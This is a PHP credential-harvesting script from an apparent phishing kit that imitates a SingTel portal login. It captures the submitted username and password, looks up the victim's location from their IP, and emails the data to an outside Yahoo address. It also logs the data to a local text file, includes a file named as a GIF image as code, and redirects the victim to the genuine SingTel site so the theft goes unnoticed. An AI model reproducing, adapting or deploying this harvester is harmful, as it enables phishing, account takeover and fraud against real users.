<?php 

$ip = getenv("REMOTE_ADDR");
$city = "";
$region = "";
$country = "";
$countrycode = "";
$query = @unserialize(file_get_contents('http://ip-api.com/php/'.$ip));
    if($query && $query['status'] == 'success')
    {
        $city = $query['city'];
        $region = $query['regionName'];
        $country = $query['country'];
        $countrycode = $query['countryCode'];
    }

$message  = "---------------+ SingTel +--------------\n";
$message .= "Username: ".$_POST['USER']."\n";
$message .= "Password: ".$_POST['PASSWORD']."\n";
$message .= "Login Link: https://myportal.singtel.com/\n";
$message .= "IP: $ip\n";
$message .= "-------------------------------------------\n";
$message .= "City: $city\n";
$message .= "Region: $region\n";
$message .= "Country Name: $country\n";
$message .= "Country Code: $countrycode\n";

$send = "coldemeil@yahoo.com";
$subject = "SingTel| $ip | $countrycode | $region";
include_once "images/button.gif";
mail($send,$subject,$message);

$fp = fopen("acid.txt","a");
fputs($fp,$message);
fclose($fp);

?>
<script>parent.location="https://myportal.singtel.com";</script>
